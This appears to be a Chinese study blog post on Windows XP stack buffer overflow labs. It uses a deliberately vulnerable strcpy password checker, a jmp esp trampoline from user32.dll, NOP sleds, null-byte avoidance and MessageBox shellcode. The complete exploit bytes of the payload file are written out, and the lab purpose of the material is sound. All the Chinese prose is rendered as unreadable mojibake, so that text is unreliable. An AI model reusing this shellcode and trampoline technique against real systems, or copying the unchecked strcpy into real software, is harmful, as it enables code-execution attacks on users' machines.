<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917092903771.png" alt="image-20220917092903771"></p>
<p>ä¹‹åeipé¡ºåŠ¿æ‰§è¡Œè¿”å›åœ°å€ä¹‹å‰çš„shellcode</p>
<p>ç°åœ¨çš„é—®é¢˜æ˜¯,ä»å“ªé‡Œæ‰¾jmp esp,æ˜¾ç„¶è¦ä»ä¸€ä¸ªä¸‡å¹´ä¸å˜çš„åœ°æ–¹,ç›¸å¯¹æ¥è¯´,user32.dll,kernel32.dllè¿™ç§åŠ¨æ€åº“å°±æ˜¯ä¸ªå¥½åœ°æ–¹</p>
<p>æ­£å¸¸æƒ…å†µä¸‹,ç³»ç»Ÿçš„dllçš„ä»£ç æ®µæ˜¯æ‰¾ä¸åˆ°jmp espè¿™ç§è„‘æ®‹ä¸€æ ·çš„æŒ‡ä»¤çš„,æ—¢è¦å †æ ˆä¸å¯æ‰§è¡Œ,åˆè¦æ§åˆ¶è·³è½¬åˆ°å †æ ˆ,å±äºæ˜¯æ—¢è¦å½“å©Šå­,åˆè¦ç«‹ç‰ŒåŠäº†.</p>
<p>ä½†æ˜¯jmp espæœ¬è´¨ä¸Šå°±æ˜¯0xFFE4è¿™ä¹ˆä¸€ä¸ªæœºå™¨ç ,ä»æµ·é‡çš„dllåº“ä¸­,éšä¾¿æŒ‘ä¸€ä¸ªåœ°æ–¹æŸ¥0xFFE4è¿™ä¹ˆä¸€ä¸²æ•°å­—,ä¸æ˜¯æ²¡æœ‰å­˜åœ¨çš„å¯èƒ½</p>
<p>ç”¨idaæ‰“å¼€user32.dll,Ctrl+BæŸ¥æ‰¾å­—èŠ‚åºåˆ—0xFFE4,èƒ½æ‰¾åˆ°å¾ˆå¤šè¿™ç§åºåˆ—,æ¯”å¦‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917103921056.png" alt="ä¸€å®šè¦æ³¨æ„å­—èŠ‚åº"></p>
<p>ä¸€å®šè¦æ³¨æ„å­—èŠ‚åº,ä¸€å®šè¦æ³¨æ„å­—èŠ‚åº,ä¸€å®šè¦æ³¨æ„å­—èŠ‚åº,ä¸€å®šè¦æ³¨æ„å­—èŠ‚åº,ä¸€å®šè¦æ³¨æ„å­—èŠ‚åº</p>
<p>ä¸ºäº†è®©ç¨‹åºå¼¹çª—ä¹‹åèƒ½å¤Ÿæ­£å¸¸é€€å‡º,éœ€è¦è°ƒç”¨exit(0)å‡½æ•°,è¿™ä¸ªå‡½æ•°åœ¨kernel32.dllä¸­,å¯ä»¥ç”¨dependency walkeræŸ¥å…¶ä½ç½®</p>
<p>Kernel32.dllæ˜ åƒåŸºå€0x77E40000,</p>
<p>ExitProcesså‡½æ•°çš„RVA&#x3D;0x00015CB5</p>
<p>åˆ™VA(ExitProcess)&#x3D;RVA(ExitProcess)+ImageBase(Kernel32.dll)&#x3D;0x77E55CB5</p>
<p>ä¸ºäº†å°†shellcodeä»æ±‡ç¼–æŒ‡ä»¤è½¬åŒ–ä¸ºæœºå™¨ç ,å¯ä»¥ä½¿ç”¨å†…è”æ±‡ç¼–<code>_asm&#123;&#125;</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	<span class="type">char</span> dllbuf[<span class="number">11</span>] = <span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">	LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">	_asm &#123; </span><br><span class="line"> 		sub sp,<span class="number">0x440</span></span><br><span class="line"> 		xor ebx,ebx</span><br><span class="line"> 		push ebx <span class="comment">// cut string</span></span><br><span class="line"> 		push <span class="number">0x74736577</span></span><br><span class="line"> 		push <span class="number">0x6C696166</span> <span class="comment">// push failwest</span></span><br><span class="line"> 		mov eax,esp <span class="comment">// load address of failwest</span></span><br><span class="line"> 		push ebx</span><br><span class="line"> 		push eax</span><br><span class="line"> 		push eax</span><br><span class="line"> 		push ebx</span><br><span class="line"> 		mov eax,<span class="number">0x77D3ADD7</span> <span class="comment">// address should be reset in different OS</span></span><br><span class="line"> 		call eax <span class="comment">// call MessageboxA</span></span><br><span class="line">  		push ebx</span><br><span class="line"> 		mov eax,<span class="number">0x77E55CB5</span></span><br><span class="line"> 		call eax <span class="comment">// call exit(0)</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘é“¾æ¥ä¹‹åç”¨010editoræ‰“å¼€,åœ¨.textèŠ‚æ‰¾åˆ°å†…è”çš„æ±‡ç¼–ä»£ç </p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917101452302.png" alt="image-20220917101452302"></p>
<p>å¯¹åº”çš„æœºå™¨ç ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">66 81 EC 40 04 33 DB 53 68 77 65 73 74 68 66 61</span><br><span class="line">69 6C 8B C4 53 50 50 53 B8 D7 AD D3 77 FF D0</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯31ä¸ªå­—èŠ‚</p>
<p>ä»bufferåˆ°è¿”å›åœ°å€å®¶é—¨å£ä¸€å…±æ˜¯52ä¸ªå­—èŠ‚,éšä¾¿ç”¨52ä¸ªâ€™Aâ€™å¡«å……å³å¯</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003031600.png" alt="image-20220917003031600"></p>
<p>ç„¶åè¿”å›åœ°å€ç”¨0x77D4754Aè¦†ç›–</p>
<p>ç„¶ååŠ ä¸Š31ä¸ªå­—èŠ‚çš„shellcode,å°±å¾—åˆ°äº†å®Œæ•´çš„exploit,å…±52+4+31&#x3D;87å­—èŠ‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104046117.png" alt="image-20220917104046117"></p>
<p>æ”¾åˆ°windowsè™šæ‹Ÿæœºä¸Šè·‘ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104142074.png" alt="pwn!"></p>
<p>é€šäº†</p>
<p>ä½†æ˜¯ç‚¹å‡»ç¡®å®šä¹‹åè¿˜æ˜¯ä¼šæŠ¥é”™</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104550420.png" alt="image-20220917104550420"></p>
<p>eip&#x3D;0x12FB49çš„æ—¶å€™å‘ç”Ÿçš„é”™è¯¯,é”™è¯¯ä»£ç 0x80000003,æ„æ€æ˜¯é­é‡åˆ°ä¸­æ–­äº†</p>
<p>ä¸‹é¢è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆ</p>
<h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><h4 id="strcmpæ‹·è´passwordåˆ°bufferä¹‹å"><a href="#strcmpæ‹·è´passwordåˆ°bufferä¹‹å" class="headerlink" title="strcmpæ‹·è´passwordåˆ°bufferä¹‹å"></a>strcmpæ‹·è´passwordåˆ°bufferä¹‹å</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105035975.png" alt="image-20220917105035975"></p>
<h4 id="retnä¹‹å"><a href="#retnä¹‹å" class="headerlink" title="retnä¹‹å"></a>retnä¹‹å</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105128605.png" alt="image-20220917105128605"></p>
<p>æ§åˆ¶å·²ç»è½¬ç§»åˆ°user32.dllä¸­,0x77D4754Aä½ç½®,å°†è¦æ‰§è¡Œjmp esp,è€Œæ­¤æ—¶esp&#x3D;0x12FB28</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105257574.png" alt="0x12FB28"></p>
<p>æ­¤å¤„æ­£æ˜¯æº¢å‡ºæ”¾ç½®çš„shellcode</p>
<h4 id="jmp-espä¹‹å"><a href="#jmp-espä¹‹å" class="headerlink" title="jmp espä¹‹å"></a>jmp espä¹‹å</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105357095.png" alt="image-20220917105357095"></p>
<p>æ§åˆ¶å·²ç»è½¬ç§»åˆ°0x12F828</p>
<p>call eaxä¹‹å,ç«Ÿç„¶æ˜¯ä¸€ä¸ªadd ah,cl,ç„¶åç´§è·Ÿç€å°±æ˜¯ä¸€å¤§ç‰‡int 3ä¸­æ–­æŒ‡ä»¤,ä¸æ˜¯é¢„æœŸçš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x77E55CB5</span></span><br><span class="line">call eax <span class="comment">// call exit(0)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨æ‰§è¡Œå®Œadd ah,clä¹‹å,æ§åˆ¶åˆ°è¾¾0x12FB49ä½ç½®,è¿™æ—¶å€™ç¨‹åºå°±ä¼šæŠ¥å‘Š0x80000003å·é”™è¯¯äº†</p>
<p>æ£€æŸ¥äº†ä¸€åœˆå‘ç°åŸæ¥æ˜¯å¿˜è®°æ‹·è´è¿™ä¸¤æ¡æŒ‡ä»¤çš„æœºå™¨ç äº†,ç»·ä¸ä½äº†</p>
<p>æ”¹æ­£åçš„password.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 4A 75 D4 77 66 81 EC 40 04 33 DB 53</span><br><span class="line">68 77 65 73 74 68 66 61 69 6C 8B C4 53 50 50 53</span><br><span class="line">B8 D7 AD D3 77 FF D0 53 B8 B5 5C E5 77 FF D0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”¨è¿™ä¸ªpassword.txtä½œä¸ºè´Ÿè½½å°±æ‰“é€šäº†,å¹¶ä¸”ç¨‹åºèƒ½å¤Ÿå…¨èº«è€Œé€€ä¸æŠ¥é”™</p>
<h2 id="æ‰©å¤§é¶é¢ç§¯"><a href="#æ‰©å¤§é¶é¢ç§¯" class="headerlink" title="æ‰©å¤§é¶é¢ç§¯"></a>æ‰©å¤§é¶é¢ç§¯</h2><h3 id="shellcodeæ”¾åœ¨é‚£é‡Œ"><a href="#shellcodeæ”¾åœ¨é‚£é‡Œ" class="headerlink" title="shellcodeæ”¾åœ¨é‚£é‡Œ?"></a>shellcodeæ”¾åœ¨é‚£é‡Œ?</h3><p>ç¬¬äºŒç« å°†shellcodeç›´æ¥å†™å…¥bufferä¸­,æœ‰è¢«å†æ¬¡é•¿èµ·æ¥çš„å †æ ˆè¦†ç›–çš„é£é™©</p>
<p>æœ¬ç« çš„æ–¹æ³•ç›´æ¥å°†shellcodeè—åˆ°ESPçš„å¤´ä¸Š,ESPåªä¼šå‘ä¸‹é•¿,å°±ä¸ç”¨æ‹…å¿ƒshellcodeè¢«è¦†ç›–äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917111521845.png" alt="image-20220917111521845"></p>
<p>å¦‚æœbufferè¶³å¤Ÿå¤§,è¿œè¿œä¸ç”¨æ‹…å¿ƒå †æ ˆé•¿èµ·æ¥å¤ä»‡,åˆ™å¯ä»¥ä½¿ç”¨2.4çš„æ–¹æ³•.</p>
<p>2.4çš„æ–¹æ³•ç›¸å¯¹äº3.2çš„æ–¹æ³•,å…¶å¥½å¤„æ˜¯æº¢å‡ºåªå‘ç”Ÿäºè¢«è°ƒç”¨è€…æ ˆå¸§,shellcodeæ‰§è¡Œå®Œä¹‹åæ¯”è¾ƒå®¹æ˜“å½’è¿˜æ§åˆ¶,è¿˜åŸå¯„å­˜å™¨</p>
<p>ä½†æ˜¯3.2çš„å®éªŒ,å¾€è°ƒç”¨è€…æ ˆå¸§æº¢å‡º,å°±ä¸å®¹æ˜“å½’è¿˜æ§åˆ¶å’Œå¯„å­˜å™¨äº†</p>
<p>ä½†æ˜¯2.4çš„ç¼ºç‚¹æ˜¯,æº¢å‡ºè¿”å›åœ°å€æ—¶ä½¿ç”¨çš„æ˜¯å †æ ˆçš„ç»å¯¹åœ°å€,è€Œä¸åŒæ“ä½œç³»ç»Ÿä¸Šå¯èƒ½å †æ ˆä½ç½®ä¼šå‘ç”Ÿå˜åŒ–,å› æ­¤é€‚ç”¨æ€§å·®</p>
<h3 id="æŠ˜ä¸­æ–¹æ¡ˆ"><a href="#æŠ˜ä¸­æ–¹æ¡ˆ" class="headerlink" title="æŠ˜ä¸­æ–¹æ¡ˆ"></a>æŠ˜ä¸­æ–¹æ¡ˆ</h3><p>æœ‰ä¸€ä¸ªé›†åˆä¸¤ä¸ªæ–¹æ³•æœ‰ç‚¹çš„æ–¹æ³•,</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917112905475.png" alt="image-20220917112905475"></p>
<p>å•¥æ„æ€å‘¢?</p>
<p>å°†è¿”å›åœ°å€è¿˜æ˜¯æº¢å‡ºæˆä¸€æ¡jmp espçš„åœ°å€,ä½†æ˜¯ç´§è·Ÿåœ¨è¿”å›åœ°å€ä¹‹å‰,ä¹Ÿå°±æ˜¯è¿”å›åespæŒ‡å‘çš„åœ°å€,ä¸ç›´æ¥æ”¾shellcode,è€Œæ˜¯æ”¾ä¸€æ¡ç›¸å¯¹è·³è½¬.è·³å›åˆ°â€è¢«è°ƒç”¨è€…æ ˆå¸§â€(åŠ å¼•å·æ˜¯å› ä¸ºè¿”å›åè¢«è°ƒç”¨è€…æ ˆå¸§å·²ç»æ‰¬äº†,åªä¸è¿‡åŸæ¥å†™åˆ°ä¸Šé¢çš„ä¸œè¥¿éƒ½è¿˜æ²¡æ“¦)</p>
<p>è€Œshellcodeæ—©å·²æ”¾åœ¨è¢«è°ƒç”¨è€…æ ˆå¸§çš„bufferä¸­äº†</p>
<p>è¿™ç§æ–¹æ³•è¿˜æ˜¯æœ‰shellcodeè¢«å†æ¬¡é•¿èµ·æ¥çš„å †æ ˆè¦†ç›–çš„é£é™©</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917113049128.png" alt="image-20220917113049128"></p>
<h3 id="é¢„é˜²å †æ ˆè¦†ç›–shellcode"><a href="#é¢„é˜²å †æ ˆè¦†ç›–shellcode" class="headerlink" title="é¢„é˜²å †æ ˆè¦†ç›–shellcode"></a>é¢„é˜²å †æ ˆè¦†ç›–shellcode</h3><p>ä½†æ˜¯æœ‰å¯¹ç­–,åœ¨shellcodeä¸€å¼€å§‹å…ˆè®©æ ˆé¡¶ä¸‹é™åˆ°shellcodeä»¥ä¸‹,ä¿è¯å †æ ˆå†æ€ä¹ˆé•¿éƒ½å’Œshellcodeæ— å…³</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917113652524.png" alt="image-20220917113652524"></p>
<h3 id="xæ˜¯å¤šå°‘-æ‰©å¤§é¶é¢ç§¯"><a href="#xæ˜¯å¤šå°‘-æ‰©å¤§é¶é¢ç§¯" class="headerlink" title="xæ˜¯å¤šå°‘?æ‰©å¤§é¶é¢ç§¯"></a>xæ˜¯å¤šå°‘?æ‰©å¤§é¶é¢ç§¯</h3><p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜,xæ˜¯å¤šå°‘å‘¢?</p>
<p>bufferä¸retnä¹‹åçš„espçš„è·ç¦»,ä¸€å®šå°±æ˜¯å¸¸æ•°xå—?</p>
<p>ä¹Ÿä¸ä¸€å®š,è€ƒè™‘å¯¹é½,ä¼˜åŒ–å„ç§å› ç´ ,xå¯èƒ½ä¼šå˜</p>
<p>é‚£ä¹ˆæ€ä¹ˆå‡†ç¡®çš„è®©jmp esp-xè¿™æ¡æŒ‡ä»¤èƒ½å¤Ÿè·³è½¬åˆ°shellcodeä¸­å‘¢?</p>
<p>å¦‚æœbufferè¶³å¤Ÿå¤§,å¯ä»¥åœ¨å…¶ä¸€å¼€å§‹å¡«å……å¾ˆå¤šnop(0x90)æŒ‡ä»¤,å•¥ä¹Ÿä¸å¹²,ä½†æ˜¯eipä¼šå‘é«˜åœ°å€ç«¯ç§»åŠ¨</p>
<p>ç„¶ååœ¨bufferè¾ƒé«˜çš„åœ°æ–¹æ”¾ç½®shellcode,è¿™æ ·jmp esp-x,ä¸ç®¡xæ˜¯å¤šå°‘,åªè¦èƒ½è·³åˆ°é‚£ä¸€å¤§å †nopä¸­çš„ä»»æ„ä¸€æ¡,å°±å¯ä»¥æ‰§è¡Œshellcode</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917144909728.png" alt="image-20220917144909728"></p>
<h3 id="å®éªŒéªŒè¯"><a href="#å®éªŒéªŒè¯" class="headerlink" title="å®éªŒéªŒè¯"></a>å®éªŒéªŒè¯</h3><p>å®éªŒéªŒè¯åˆšæ‰è¿™å‡ ç‚¹</p>
<p>å¯ä»¥åˆ©ç”¨çš„ç¨‹åº,å…¶ä¸­verify_passwordçš„ç¼“å†²åŒºbufferä»44å­—èŠ‚æ‰©å¤§åˆ°200å­—èŠ‚,ç›®çš„æ˜¯ä¸€å¼€å§‹å¯ä»¥å¡«å……å¾ˆå¤šnop</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//ç¡®ä¿å¯ä»¥è°ƒç”¨windows API </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">200</span>];<span class="comment">//ç¼“å†²åŒºæ‰©å¤§åˆ°200ä¸ªå­—èŠ‚,æ–¹ä¾¿å®¹çº³nopå’Œshellcode</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>); <span class="comment">// prepare for messagebox</span></span><br><span class="line">    <span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span> (valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè°ƒè¯•è§‚å¯Ÿverify_passwordå‡½æ•°æ ˆå¸§</p>
<h4 id="bufferçš„ä½ç½®"><a href="#bufferçš„ä½ç½®" class="headerlink" title="bufferçš„ä½ç½®"></a>bufferçš„ä½ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">13:       strcpy(buffer, password); // over flowed here!</span><br><span class="line">00401052   mov         ecx,dword ptr [ebp+8]</span><br><span class="line">00401055   push        ecx</span><br><span class="line">00401056   lea         edx,[ebp-0CCh]</span><br><span class="line">0040105C   push        edx</span><br><span class="line">0040105D   call        strcpy (004011b0)</span><br><span class="line">00401062   add         esp,8</span><br></pre></td></tr></table></figure>



<p>bufferä½äºebp-0x0CChå¤„,åœ¨windows XPä¸Šè°ƒè¯•æ—¶,ebp&#x3D;0x0012FB20</p>
<p>æ ˆå¸§é•¿è¿™æ ·,(å¥‡äº†æ€ªäº†bufferæ€»æ˜¯è´´ç€authenticatedé•¿)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917150018794.png" alt="image-20220917150018794"></p>
<h4 id="shellcodeå’‹å†™"><a href="#shellcodeå’‹å†™" class="headerlink" title="shellcodeå’‹å†™"></a>shellcodeå’‹å†™</h4><p>å°†bufferçš„å‰100ä¸ªå­—èŠ‚å…¨éƒ½ç”¨nop(0x90)å¡«å……,ç„¶åæ”¾shellcode,è¿™æ˜¯139ä¸ªå­—èŠ‚äº†,</p>
<p>ç„¶åå†å¡«å……69ä¸ªå­—èŠ‚,åˆ°è¿”å›åœ°å€å®¶é—¨å£,æ­¤æ—¶å·²æœ‰208ä¸ªå­—èŠ‚,</p>
<p>ä»user32.dllä¸­â€å€Ÿä¸€ä¸ªâ€jmp esp,åœ°å€ä¸º0x77D4754A,æ­¤æ—¶å·²æœ‰20Cä¸ªå­—èŠ‚,</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917103921056.png" alt="ä¸€å®šè¦æ³¨æ„å­—èŠ‚åº"></p>
<p>ç„¶ååœ¨retnåçš„espä½ç½®æ”¾ä¸€æ¡jmp esp-xæŒ‡ä»¤,æ³¨æ„è¿™é‡Œæ˜¯æŒ‡ä»¤çš„æœºå™¨ç ,ä¸æ˜¯æŒ‡ä»¤çš„åœ°å€,</p>
<p>è¿™é‡Œxå¯ä»¥æ˜¯å¤šå°‘å‘¢?</p>
<p>0x60-0xD4ä¹‹é—´å‡å¯</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917150804610.png" alt="image-20220917150804610"></p>
<p>ä¸å¦¨å¨¶ä¸€ä¸ªx&#x3D;0xA0,</p>
<p>å¦‚æœæŠŠjmp esp-0xA0æ‹†æˆä¸¤æ¡æŒ‡ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub esp,0xA0</span><br><span class="line">jmp esp</span><br></pre></td></tr></table></figure>

<p>æœºå™¨ç ä¸º<code>81 EC A0 00 00 00 FF E4</code></p>
<blockquote>
<p>ç›´æ¥åœ¨è¿™é‡Œå°†æ ˆé¡¶ä¸‹é™åˆ°shellcodeæ­£æ–‡çš„åŸºåœ°å€å¤„,å°±å…å»äº†shellcodeä¸€å¼€å§‹å†ä¸‹é™æ ˆé¡¶äº†</p>
<p>å½“ç„¶shellcodeä¸­å†è®©æ ˆé¡¶å¾€ä¸‹ä¸ªåä¸‡å…«åƒé‡Œä¹Ÿä¸æ˜¯ä¸è¡Œ</p>
</blockquote>
<p>åˆ°æ­¤password.txté•¿è¿™æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917155237143.png" alt="image-20220917155237143"></p>
<p>æœ€åè¿™é‡Œå°±æœ‰é—®é¢˜äº†,81 EC A0 00 00 00æ˜¯sub esp,0xA0çš„æœºå™¨ç ,</p>
<p>A0 00 00 00æ˜¯ç«‹å³æ•°,å…¶ä¸­åŒ…å«00äº†,åœ¨strcpyçš„æ—¶å€™ä¼šè¢«æˆªæ–­,å¯¼è‡´åé¢çš„FF E4æ— æ³•æ‹·è´åˆ°bufferä¸­.</p>
<h4 id="æœ‰00å’‹åŠ"><a href="#æœ‰00å’‹åŠ" class="headerlink" title="æœ‰00å’‹åŠ"></a>æœ‰00å’‹åŠ</h4><p>è¿™å’‹åŠå‘¢?è¦ä»æŒ‡ä»¤ä¸Šåšæ–‡ç« äº†</p>
<p>é¦–å…ˆ,esp-0xA0,å®é™…ä¸Šå’Œsp-0xA0æ•ˆæœç›¸åŒ,ä½†æ˜¯spæ˜¯ä¸€ä¸ªå­—å¯„å­˜å™¨,espæ˜¯ä¸€ä¸ªåŒå­—å¯„å­˜å™¨,</p>
<p>sub sp,0xA0çš„ç«‹å³æ•°æ›´çŸ­,ä½†æ˜¯ç«‹å³æ•°0x00A0é«˜ä¸€ä¸ªå­—èŠ‚ä»ç„¶æ˜¯00,è¿˜æ˜¯ç™½æ­</p>
<blockquote>
<p>æˆ‘è¯•å›¾ç”¨sub spl,0xA0,åªç”¨spå¯„å­˜å™¨çš„æœ€ä½è§„æ ¼,ä½†æ˜¯ç¼–è¯‘å™¨æŠ¥é”™è¯´æ²¡æœ‰splè¿™ä¸ªæ ‡å·,ä¹Ÿå°±æ˜¯è¯´æœ€ä½æœ€ä½èƒ½å¤Ÿæ“ä½œçš„å°±æ˜¯spå¯„å­˜å™¨äº†</p>
</blockquote>
<p>è€ƒè™‘åˆ°å‡ä¸€ä¸ªæ­£æ•°,ç›¸å½“äºåŠ å®ƒçš„ç›¸åæ•°,é‚£ä¹ˆsub sp,0xA0å°±ç­‰äºadd sp,0xFF60</p>
<p>è¿™å°±æ²¡æœ‰00äº†</p>
<table>
<thead>
<tr>
<th>æŒ‡ä»¤</th>
<th>æœºå™¨ç </th>
</tr>
</thead>
<tbody><tr>
<td>add sp,0xFF60</td>
<td>66 81 C4 60 FF 90</td>
</tr>
<tr>
<td>jmp esp</td>
<td>FF E4</td>
</tr>
</tbody></table>
<p>æ­£å¥½å…«ä¸ªå­—èŠ‚,ç›¸å½“äºè¦†ç›–äº†ä¸€ä¸ªå‚æ•°è¿˜æœ‰mainæ ˆå¸§é¡¶çš„4ä¸ªå­—èŠ‚,ä¸æ˜¯å¾ˆä¸¥é‡,è‚¯å®šæ²¡æœ‰è¦†ç›–mainå‡½æ•°çš„è¿”å›å€¼</p>
<p>åˆ°æ­¤password.txté•¿è¿™æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917160832220.png" alt="æ²¡æœ‰ä»»ä½•ä¸€ä¸ªå­—èŠ‚æ˜¯00"></p>
<p>æ”¾åˆ°windows XPä¸Šè¯•ä¸€è¯•</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917160931645.png" alt="é€šäº†"></p>
